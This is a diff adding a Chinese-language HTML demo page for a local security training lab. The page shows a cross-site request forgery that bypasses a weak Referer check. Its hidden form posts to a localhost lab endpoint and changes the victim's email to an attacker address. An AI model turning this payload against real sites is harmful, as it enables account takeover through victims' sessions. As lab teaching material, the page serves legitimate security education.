@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Medium CSRF 本地演示页</title>
+    <style>
+        body { max-width: 680px; margin: 48px auto; padding: 24px; font-family: "Microsoft YaHei", sans-serif; color: #182235; background: #eef3f8; }
+        main { padding: 24px; border: 1px solid #dce4ee; border-radius: 8px; background: #fff; }
+        button { min-height: 42px; padding: 0 18px; border: 0; border-radius: 8px; background: #1aa7d9; color: #07111f; font-weight: 800; cursor: pointer; }
+        code { word-break: break-all; }
+    </style>
+</head>
+<body>
+<main>
+    <h1>Medium CSRF 弱 Referer 演示</h1>
+    <p>仅用于本机授权环境。请先在 <code>http://localhost/labs/</code> 切换到 Medium，并保持该浏览器会话。</p>
+    <p>此页建议通过 <code>http://localhost.localhost/labs/tools/csrf_medium.html</code> 打开。攻击源与目标不同，但 Referer 主机仍包含目标字符串 <code>localhost</code>。</p>
+    <form method="post" action="http://localhost/labs/csrf.php">
+        <input type="hidden" name="form_action" value="change_email">
+        <input type="hidden" name="email" value="medium-attacker@evil.test">
+        <button type="submit">提交跨来源邮箱修改</button>
+    </form>
+</main>
+</body>
+</html>
